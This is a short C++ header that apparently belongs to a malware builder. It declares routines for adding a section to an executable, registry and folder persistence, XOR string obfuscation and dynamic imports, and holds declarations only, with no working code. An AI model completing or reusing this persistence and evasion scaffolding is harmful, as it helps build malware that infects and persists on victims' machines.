#pragma once
#include <Windows.h>
#include <string>
#include <vector>

#include "file.h"
#include "xor.h"
#include "DynImport.h"

using std::string;
using std::vector;

#define XOR(x) XorStr(x)

class Module
{
	class CFile
	{
		vector<byte> vecFile;
		HANDLE hFile;

		DWORD Align(DWORD size, DWORD align, DWORD addr) const;
	public:
		CFile(const string & sFileName);
		~CFile();

		bool AddSection(const string & sName, const vector<byte> & vecData);
		bool IsFileValid();
	};

public:
	Module(const string & path, const string & settings);

	static void RegistryPersistance(const string & dir);
	static void FolderPersistance(const string & dir);
};